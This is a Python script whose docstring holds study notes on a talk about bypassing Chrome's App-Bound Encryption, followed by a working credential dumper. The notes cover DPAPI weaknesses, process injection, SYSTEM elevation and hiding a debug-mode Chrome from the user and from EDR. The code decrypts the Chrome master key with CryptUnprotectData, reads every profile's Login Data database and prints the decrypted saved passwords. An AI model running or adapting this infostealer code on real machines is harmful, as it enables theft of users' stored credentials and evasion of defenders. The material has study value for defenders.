'''
CPE

LoginData: AES256-CGM

DPAPI: Windows data protection api



video for v20:

bypassing App-Bound Encryption to Dump Browser Credentials | HuntersCON 2024 Keynote
Marcus Hutchins


Introduction to the Chrome Password Manager

 - Chrome has a built-in password manager
 - other browsers like edge and brave use the same code since they are built on chrome.
 - Stored-Credentials are stored in an SQlite database named "Login Data"
 - Database path: C:/Users/{user}/AppData/Local/Google/Chrome/User Data/{profile}/Login Data
 - sql query: "SELECT origin_url, username_value, password_value FROM logins"

Why no Passwords?:

 - Got the url and the username as plain text, but the password is encrypted.
 - passwords are encrypted using AES-GCM
 - The AES encryption key is found in Local State:
 C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State
  **Not a json file but can be read as one**

"os_crypt :" {
	"encrypted_key":"RFBBUEk...",
	"app_bound_encrypted_key": "QVBQQg...", 
	...
 - Both keys are 64bit encoded
 - encrypted_key starts with RFBBUEk, which is b64 for DPAPI
 - app_bound_encrypted_key starts with QVBQQg, which is b64 for APPB


There is more:
 - Ignore App_bound for now.
 - encrypted_key is still encrypted, but it is encrypted using DPAPI
 	- This can be found by searching chrome source code if you really wanted


 DPAPI in an overview:
  - Encryption key unqiue to user, encryption key is made using the users password.
  - When user logs in, automatically decrypts password and keeps it in memory unencrypted.

  - software apis can then allow you to call CryptProtectData() or CryptUnprotectData() easily.
	- This is handled by the system and does it automatically based on the user.

 When is DPAPI Usefull?
  - Very good at protecting data against other users on the system.
  - Prevents anyone without your user info from getting info
 The FLAWs:
  - 1 single key used for everything tied to the account.
  - works from low privelage

  Chromes attempted fix:
   - Creating privelage boundries between different apps running under the same user account
   - windows is very weak and vulnerable compared to other devices on this front
   - Chrome attempted to build a psuedo-implementaion called App-Bound Encryption
   -App-Bound encrytions goal is to make it so only Chrome can decrypt data protected by chrome.

Chrome Broker Process:
	- Is an intependant process running at system level soley responsible for decrypting the key.
	- has an API where chrome gives it the Decrypt key and requests for it to be decrypted. 
	 - It then returns the decrytped key.

	- this process can make it so it only allows for chrome processes to allow requests and can deny the rest.

	:Grabs the handle of the calling process,
	does path validation (only checks if it is running from the chrome installation dir)
	[this is good since that dir write prevliage is locked behind admin]

	- Unfortunatly for them, still many bypasses

Code Injection / Process Hollowing:
 - Most chrome processes are designed to run with low privelages to limit browser explotation.
 - this creates the op for un-elevated infostealer to inject into un-elevated chrome process, then issue a request from within.
 Downside: this is often caught by EDR's and negate its usefulness (Noisy)

Elevation to system:
 - Since the key is protected by via the SYSTEM account, it can be decrypted by any account running as SYSTEM.
 - Attackers could leverage privelage escalation exploits to obtain system privelages.
 - or if the user is an Administartor and doesn't have UAC properly configured, process runing as admin can launch as system.
 - Assuming users are restricted to standatd, privexc exploits are very noisy and EDR can flag them.

Remote Debug mode:
 - Chrome has remote debug capabilities which can be enabled with a command line flag.
 - Attacker can launch a legit chrome process and control it from the debug port.
 - To Avoid tipping off user by launching a new broswer:
 	- Run chrome in headless mode using cmd ln switch
 	- Set the window position to coordinates off screen.
 	- Create a hidden desktop with CreateDesktop() then run chrome there.
 -This method does not require any database parsing or decryption. We can just get chrome to hand them over.
 - The cmd flags CAN still be picked up by defenders.

Google saw this coming:
 - They knew of all these bypasses before release.
 - Limited by microsofts decisions.
 - It was designed so that info stealers had to make more nooise and get caught by EDRs



'''

import sqlite3, os, getpass
from pathlib import Path
import json
import base64
import win32crypt
from Crypto.Cipher import AES


def decrypt_password(aes_key, password_block):

	#Legacy:
	if not password_block.startswith(b'v'):
		return None

	if password_block.startswith(b'v20'):
		print(":v20 Auth:")
		return None

	elif password_block.startswith(b'v10') or password_block.startswith(b'v11'):
		print(":V10 / V11 Auth:")

		nonce = password_block[3:15] #Initializtion Vector
		enc_password = password_block[15:-16] #Get password cipher by removeing suffix bytes (last 16 bits)
		signature = password_block[-16:]

		try:
			#Build Cipher using key and initialization vector
			cipher = AES.new(aes_key[:32], AES.MODE_GCM, nonce)
			decrypted = cipher.decrypt_and_verify(enc_password, signature)

			return decrypted 

		except Exception as e:
			print(f"Decryption Failed: {e}")
			return -1
	

def extract(): 

	user = getpass.getuser()

	#build path to profiles dir
	chrome_user_dir = Path(f'C:/Users/{user}/AppData/Local/Google/Chrome/User Data/')

	#GET KEY
	# -- File to get master key
	local_state = chrome_user_dir / "Local State"

	# -- Verify local state exists.
	if not local_state.exists():
		print("local state not found.")
		return

	# -- Get key from json
	with open(local_state, 'r') as f:
		#ctx = f.read()
		ctx = json.load(f)
		key = base64.b64decode(ctx['os_crypt']['encrypted_key'])
		app_key = base64.b64decode(ctx['os_crypt']['app_bound_encrypted_key'])

		#print("encrypted_key: ", key)
		#print("app_bound_encrypted_key: ", app_key)

		#remove suffix's
		key = key[5:]
		app_key = app_key[4:]

		#print("=======================")
		#print("encrypted_key: ", key)
		#print("app_bound_encrypted_key: ", app_key)
		#exit()


		#AES-Key
		key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
		#app_key = win32crypt.CryptUnprotectData(app_key, None, None, None, 0)[1]

		print("Key Length: ", len(key))
		#print("Key Length: ", len(app_key))

	#Get Passwords

	# -- get profile list
	profiles = ['Default']

	# -- Find all profiles on machine, add them to list
	for child in chrome_user_dir.iterdir():
		if child.name.upper().startswith("PROFILE"):
			profiles.append(child.name)
	
	# -- itter through profiles
	for profile in profiles:
		print("====== ", profile, " ======")

		# -- get database path
		db = chrome_user_dir / profile / "Login Data"
	
		# -- Check that the database path is real
		if not db.exists():
			print("database not found")
			continue
		
		# -- Connect to profile db
		with sqlite3.connect(db) as conn:
			cur = conn.cursor()
			cur.execute("SELECT origin_url, username_value, password_value FROM logins")
			res = cur.fetchall()
	
		for login in res:
			url, username, enc_pass = login
			try:
				dec_pass = decrypt_password(key, enc_pass)
	
				print(f"URL: {url}\nUSERNAME: {username}, \nPASSWORD: {dec_pass}\n")
			except Exception as e:
				print(f"URL: {url}\nUSERNAME: {username}, \nPASSWORD: {e}\n")

		exit()




if __name__ == "__main__":
	extract()
